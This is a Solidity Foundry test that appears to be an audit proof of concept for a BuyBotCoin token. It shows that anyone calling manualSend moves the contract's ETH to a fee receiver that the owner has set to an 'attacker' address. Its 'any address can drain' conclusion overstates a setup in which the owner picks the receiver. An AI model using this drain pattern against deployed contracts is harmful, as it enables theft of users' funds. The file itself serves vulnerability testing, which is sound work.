// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/BuyBotCoin.sol";

contract MockRouter {
    function factory() external pure returns (address) {
        return address(0x123);
    }
}

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0x456);
    }
}

contract BuyBotCoinManualSendTest is Test {
    BuyBotCoin token;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");
    address constant ROUTER_ADDRESS = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    
    function setUp() public {
        // Setup mock router
        MockRouter mockRouter = new MockRouter();
        MockFactory mockFactory = new MockFactory();
        
        // Patch router address with mock
        vm.etch(ROUTER_ADDRESS, address(mockRouter).code);
        vm.etch(address(0x123), address(mockFactory).code);
        
        // Deploy token (test contract is initial owner)
        token = new BuyBotCoin();
        
        // Transfer ownership to designated owner
        token.transferOwnership(payable(owner));

        // Set ecosystem fee receiver to attacker
        vm.prank(owner);
        token.setFeeReceiver(address(0), attacker);
    }

    function test_ManualSendEthToArbitraryAddress() public {
        // Fund token contract with ETH
        uint256 initialEthBalance = 1 ether;
        vm.deal(address(token), initialEthBalance);

        console.log("--- BEFORE-Trigger ---");
        uint256 tokenBalanceBefore = address(token).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Token contract ETH balance: %s", tokenBalanceBefore);
        console.log("Attacker ETH balance: %s", attackerBalanceBefore);

        console.log("--- Trigger: manualSend ---");
        // Execute manualSend (any address can trigger)
        vm.prank(attacker);
        token.manualSend();

        console.log("--- AFTER-Trigger ---");
        uint256 tokenBalanceAfter = address(token).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Token contract ETH balance: %s", tokenBalanceAfter);
        console.log("Attacker ETH balance: %s", attackerBalanceAfter);

        // Check vulnerability exploitation
        bool exploited = tokenBalanceAfter == 0 && attackerBalanceAfter == initialEthBalance;
        if (exploited) {
            console.log("Vulnerability confirmed: ETH drained to attacker");
            console.log("Vulnerability Exists: manualSend allows arbitrary ETH draining by any address");
        } else {
            console.log("Vulnerability unconfirmed: ETH remains in contract");
            console.log("Vulnerability not Exist: ETH draining conditions not met");
        }
    }
}